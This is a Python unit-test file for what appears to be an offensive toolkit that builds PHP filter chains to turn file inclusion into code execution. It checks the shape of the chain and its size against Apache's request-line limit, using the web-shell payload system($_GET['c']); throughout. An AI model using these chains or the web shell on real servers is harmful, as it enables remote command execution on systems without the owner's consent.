"""The filter chain, without needing PHP to check it.

What is worth pinning down here is the shape and the size. The size matters most:
a chain grows by roughly two hundred and fifty characters per byte of payload,
and a web server refuses a request line past its limit - so a chain that is too
long looks exactly like a filter that worked when neither happened.
"""

from __future__ import annotations

import unittest
from urllib.parse import quote

from injectorkit.core.filters import EMPTY_RESOURCE, chain, php_runner

# Apache's default LimitRequestLine, which is the limit that bit us in testing.
REQUEST_LINE_LIMIT = 8190


class ChainShape(unittest.TestCase):
    def test_the_chain_starts_with_the_filter_wrapper(self):
        self.assertTrue(chain(b"hello").startswith("php://filter/"))

    def test_the_chain_ends_at_a_resource(self):
        self.assertTrue(chain(b"hello").endswith(f"resource={EMPTY_RESOURCE}"))

    def test_the_resource_can_be_chosen(self):
        self.assertIn("resource=index.php", chain(b"hello", "index.php"))

    def test_the_two_halves_are_joined_by_a_pipe(self):
        self.assertIn("|", chain(b"hello"))

    def test_it_ends_with_a_base64_decode(self):
        # The decode is what turns the built-up base64 back into the payload.
        self.assertIn("convert.base64-decode", chain(b"hello"))


class PhpRunner(unittest.TestCase):
    def test_it_opens_the_tag_itself(self):
        # The argument is a PHP fragment, not a document. A caller that passes
        # "<?php ..." as well gets "<?php <?php ...", which parses as nothing and
        # fails without a message - the kind of silence that reads as a blocked
        # filter.
        fragment = php_runner("system($_GET['c']);")
        self.assertTrue(fragment.startswith("php://filter/"))

    def test_a_longer_fragment_makes_a_longer_chain(self):
        short = len(php_runner("id"))
        long = len(php_runner("x" * 32))
        self.assertGreater(long, short)

    def test_the_growth_is_linear_in_the_payload(self):
        # Roughly 250 characters per byte; the exact constant is not the point,
        # but a quadratic blow-up would be.
        one = len(php_runner("a"))
        two = len(php_runner("aa"))
        self.assertLess(two, one * 3)


class SizeAgainstTheRequestLine(unittest.TestCase):
    def test_the_reader_chain_fits_in_a_request_line(self):
        # This is the whole reason the command travels in a second parameter:
        # the chain carries a short reader, not the command.
        reader = php_runner("system($_GET['c']);")
        self.assertLess(len(quote(reader, safe="")), REQUEST_LINE_LIMIT)

    def test_a_long_payload_is_the_one_that_would_not_fit(self):
        # A reminder of the boundary rather than a wish: twenty-eight bytes of
        # payload already sits near the limit, so anything that travels inside
        # the chain has to be small.
        small = len(quote(php_runner("id;"), safe=""))
        large = len(quote(php_runner("x" * 40), safe=""))
        self.assertLess(small, REQUEST_LINE_LIMIT)
        self.assertGreater(large, REQUEST_LINE_LIMIT)


if __name__ == "__main__":
    unittest.main()
